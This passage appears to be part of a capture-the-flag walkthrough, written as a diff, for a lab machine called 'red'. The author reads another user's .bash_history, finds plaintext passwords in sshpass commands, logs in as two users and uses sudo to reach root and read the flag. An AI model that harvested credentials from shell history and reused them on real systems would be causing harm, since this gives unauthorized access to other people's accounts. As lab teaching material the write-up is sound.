+Isn't that handy, I can get into their home directory....and well, everyone else's as well.
+
+SHayslett@red:/home/JKanode$ more .bash_history
+id
+whoami
+ls -lah
+pwd
+ps aux
+sshpass -p thisimypassword ssh JKanode@localhost
+apt-get install sshpass
+sshpass -p JZQuyIN5 peter@localhost
+ps -ef
+top
+kill -9 3747
+exit
+
+Well...isn't that convent.
+
+JKanode@192.168.118.184's password:
+Welcome back!
+
+JKanode@red:~$ sudo su
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+[sudo] password for JKanode:
+JKanode is not in the sudoers file.  This incident will be reported.
+
+Worth a try :) at least we know that is the right password.  Might as well check peter as well.
+
+peter@192.168.118.184's password:
+Welcome back!
+This is the Z Shell configuration function for new users,
+zsh-newuser-install.
+You are seeing this message because you have no zsh startup files
+(the files .zshenv, .zprofile, .zshrc, .zlogin in the directory
+~).  This function can help you with a few settings that should
+make your use of the shell easier.
+
+You can:
+
+(q)  Quit and do nothing.  The function will be run again next time.
+
+(0)  Exit, creating the file ~/.zshrc containing just a comment.
+     That will prevent this function being run again.
+
+(1)  Continue to the main menu.
+
+(2)  Populate your ~/.zshrc with the configuration recommended
+     by the system administrator and exit (you will need to edit
+     the file by hand, if so desired).
+
+--- Type one of the keys in parentheses --- ^C
+
+Aborting.
+The function will be run again next time.  To prevent this, execute:
+  touch ~/.zshrc
+red%
+red% whoami
+peter
+red% sudo su
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+[sudo] password for peter:
+➜  peter whoami
+root
+➜  peter
+
+You don't say!
+
+➜  peter bash
+root@red:/home/peter# cd /root
+root@red:~# ls
+fix-wordpress.sh  flag.txt  issue  python.sh  wordpress.sql
+root@red:~# more flag.txt
+~~~~~~~~~~<(Congratulations)>~~~~~~~~~~
+                          .-'''''-.
+                          |'-----'|
+                          |-.....-|
+                          |       |
+                          |       |
+         _,._             |       |
+    __.o`   o`"-.         |       |
+ .-O o `"-.o   O )_,._    |       |
+( o   O  o )--.-"`O   o"-.`'-----'`
+ '--------'  (   o  O    o)  
+              `----------`
+b6b545dc11b7a270f4bad23432190c75162c4a2b
+
+root@red:~#
+
+I spent longer than i want to admit digging into wordpress.  I'm sure there is something there to find, but a simple bad password was enough to get in.
